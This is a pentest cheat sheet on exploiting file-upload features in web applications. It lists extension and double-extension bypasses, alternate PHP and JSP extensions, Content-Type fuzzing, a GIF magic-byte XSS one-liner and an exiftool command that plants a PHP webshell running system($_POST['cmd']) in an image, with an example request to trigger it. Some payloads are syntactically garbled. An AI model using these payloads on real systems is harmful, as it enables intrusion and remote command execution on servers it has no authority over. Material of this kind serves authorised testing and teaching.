# Exploiting File Upload Functionality
> Tips and tricks for exploiting the ability to upload a file to a web application. 

#### Quick Checks
- [ ] is the app checking the file extension
- [ ] is the app checking the Content-Type header
- [ ] is the app checking the magic bytes of the file uploaded
- [ ] is the app adding the expected file extension to the end automatically? 
- [ ] is the app using a denylist of extensions?

### Exploits
- The app is just looking to see if the extension is accepted:
	- rename your file -> revshell.jpg.php, revshell.jpg.php
	- (LESS COMMON) rename the file so the valid extension is last -> revshell.php.jpg

- The app is only checking for base file extensions: 
	- PHP -> _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc
	- JSP -> .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
	- Perl -> pl, .cgi
		- rename file with any of above -> Ex: revhsell.php7

- Modify the Content-Type header: 
	- will it accept text/plain, appplication/octet-stream, text/html...? 
	- paste [this payload list](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/web/content-type.txt) into burp intruder and Content-Type as the payload position to see what content-types are accepted

- if the app is checking the magic bytes of the uploaded file
	-  edit the magic bytes to appear as another file type
	- Example, impersonating a GIF file with magic bytes: 
		- ```echo GIF89a/*.....,..../*.....;*/*=1;\alert(\test\);\; > fake.gif```
		- stores an XSS payload into a valid GIF file
	- Put a PHP webshell into an image with exiftool: 
		-  ```exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg```
			- request the webshell w/ command URL parameter -> ```http://[ip]/upload/location/img.jpg?cmd=ls```








